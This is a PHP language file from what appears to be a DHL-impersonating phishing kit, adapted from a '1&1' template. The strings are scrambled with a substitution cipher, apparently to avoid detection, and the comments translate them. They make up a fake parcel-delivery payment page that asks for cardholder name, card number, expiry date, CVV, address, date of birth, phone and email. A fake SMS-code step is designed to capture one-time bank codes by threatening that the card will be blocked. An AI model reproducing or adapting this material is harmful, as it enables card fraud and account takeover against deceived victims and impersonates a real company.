<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+ Author Name      : ZÉROFAUTES
* |Z|É|R|O|F|A|U|T|E|S| Template Name    : 1&1
* +-+-+-+-+-+-+-+-+-+-+ Template Version : V.0.1
===========================================================================*/
function lang($phrase){
	static $lang = array(
		/* Main Page */
		'Title'  => '| Welcome |', 										/* Title */
		'Fo9001'  => 'Uiromet cpzevatiz', 								/* Loading Header */
		'Fo9002' => 'Bpzrntzz cpzevatiz', 								/* Loading P 1 */
		'LdngP2' => 'Ztnd umcxmgtz,', 									/* Loading P 2 */
		'LdngP3' => 'Itctrot umcxtez', 									/* Loading P 3 */
		'LdngP4' => 'Htlu & cvnemce',  									/* Loading P 4 */
		'LdngP5'	 => 'DHL Eimcxrng.',	  							/* DHL TRACKING */
		'CntP'	 => 'Htit yvp qrll frnd rnfviamervn mbvpe yvpi zhruatnez.',	  								/* Control Panel */
		'CusId'	 => 'Eimcx yvpi umictl zhruatnez me mny erat fiva 		
					zhruurng ev dtlrotiy',		  						/* Customer ID */
		'InpL1'	 => 'DHL zhruatne',										/* Label Input 1 */
		'CusPs'	 => 'eimcxrng npabti 00340434139185930097 - ',		  									/* Customer Password */
		'InpL2'	 => 'Zemepz: ',							/* Label Input 2 */
		'Rmmbr'	 => 'rn dtlrotirng',										/* Remember Me */
		'Lbtn'	 => 'Rauviemne atzzmgt!',											/* Login Btn */
		'Span1'	 => 'Ev cvaultet eht dtlrotiy mz zvvn mz uvzzrblt, ultmzt cvnfria eht umyatne ',				/* Are you still ... */
		'Span2'	 => 'By clrcxrng Ntke. Vnlrnt cvnfriamervn apze bt 
					amdt qrehrn eht ntke 14 dmyz, btfvit re tkuritz.',							/* Become our customer ... */
		'Ntke'	 => 'Ntke',									/* Btn next */
		'AsdH2'	 => 'DHL Umcxmgt',											/* Service */
		'AsdS1'	 => 'DHL Ztiorctz',										/* MailXchange */
		'AsdS2'	 => 'DHL Tkuitzz',						/* Detailed help and contact */
		'AsdS3'	 => 'DHL Lvgrzercz',										/* Online FAQs */
		'AsdS4'	 => 'Cvnemce',										/* GoToAssist */
		'P1H1'	 => 'Htlu & cpzevati ztiorct',								/* 1&1 MyWebsite*/
		'P1Pr'	 => 'Htit&apos;z hvq re qvixz',											/* Paragraphe 1 Paragraphe */
		'P2H1'	 => 'Avbrlt Muuz',								/* Microsoft Office 365 */
		'P2Pr'	 => 'Mbvpe Pz',					/* Paragraphe 2 Paragraphe */
		'P3H1'	 => 'Uvze DHL',									/* 1&1 Domains */
		'P3Pr'	 => 'Itzuvnzrbrlrey',											/* Paragraphe 3 Paragraphe */
		'PLink'	 => 'Uitzzt',									/* More information */
		'FtrS1'	 => 'Cmitti',							/* 1&1 Internet Ltd. • 2018 */
		'FtrS2'	 => ' DHL Rnetinmervnml GabH - Mll irghez itztiotd.',									/* Privacy Policy */
		'Sfokh'	 => 'Qt nttd yvpi mdditzz ev bt zpit ehme pnmpehvirstd utizvnz cmnnve mcctzz yvpi umcxmgtz, Yvp hmot ',									/* We need your address to be sure */
		'Ayam'	 => '10 qvixrng dmyz',									/* 10 working days */
		'Froth'	 => 'Fiva eht miiroml vf yvpi umcxmgt ev eht DHL bimnch, mfeti ehrz erat, eht umcxmgt qrll bt itepintd ev eht ztndti.',									/* From the arrival of your package */
		
		
		
		
		
		
		
		'InptCC'	 => 'Cmidhvldti&apos;z nmat',									/* Cardholder's name */
		'InptCCN'	 => 'Citdre cmid npabti',									/* Credit card number */
		'ExpMmAa'	 => 'Tku AA=YY',									/* Expir */
		'NumCvC'	 => 'COO (COC)',									/* CVV */
		'AddInf'	 => 'Mdditzz',									/* Address */
		'CodPOs'	 => 'Sru Cvdt',									/* Zip */
		'MdiNa'	 => 'Crey',									/* Zip */
		'Zdiyad'	 => 'Dmet vf Brieh DD=AA=YYYY',									/* DOB */
		'Farnon'	 => 'Uhvnt Npabti',									/* Phone Number */
		'Barid'	 => 'Yvpi T-amrl',									/* Your Email */
		'PlzCon'	 => 'Ultmzt cvnfria eht fvllvqrng umyatne.',									/* Please confirm the following */
		'Theun'	 => 'Eht pnrwpt umzzqvid hmz bttn ztne ev eht avbrlt npabti lrzetd btlvq. Rf yvp nttd ev chmngt yvpi avbrlt npabti, ultmzt cvnemce yvpi bmnx vi avdrfy re orm eht momrlmblt chmnntlz (MEA, qtb).',									/* Please confirm the following */
		'March'	 => 'Atichmne:',									/* Merchant */
		'ExpDh'	 => 'DHL TKUITZZ',									/* DHL EXPRESS */
		'Ch7al'	 => 'Mavpne:',									/* Amount */
		'Tarikh'	 => 'Dmet:',									/* Date */
		'TlNum'	 => 'Yvpi Uhvnt Npabti:',									/* Your Phone Number */
		'SmCos'	 => 'cvdt ZAZ:',									/* Your SMS */
		'PlzSm'	 => 'Ultmzt tneti eht otirfrcmervn cvdt itctrotd by zaz: ',				/* Please enter the */
		'Subnn'	 => 'Zpbare',				/* Submit */
		'AllCp'	 => 'DHL Rnetinmervnml GabH - Mll irghez itztiotd.',				/* All Right */
		'SmEnv'	 => 'ZAZ cvdt ztne...',				/* SMS code sent... */
		'SmWron'	 => 'ZAZ rz qivng vi tkuritd! Mfeti (3) tiiviz rn tnetirng eht cvdt itctrotd orm ZAZ, eht cpiitne eimnzmcervn rz cmnctltd mnd eht citdre cmid blvcxtd.',				/* SMS is wrong */
		'LastSm'	 => 'Qminrng! Ultmzt Tneti eht lmze ZAZ itctrotd',				/* SMS is wrong */
		'YouHav'	 => 'Yvp hmot zpcctzzfplly mcerometd yvpi zhruurng uivctzz.<br>Yvp qrll itctrot mn tamrl fiva pz qhtn qt ztnd yvpi umcxmgt.'				/* SMS is wrong */
		
		
		
		
	);	
	return $lang[$phrase];
}




//		 | ' | = &apos;




 ?>
 
 
 
 
 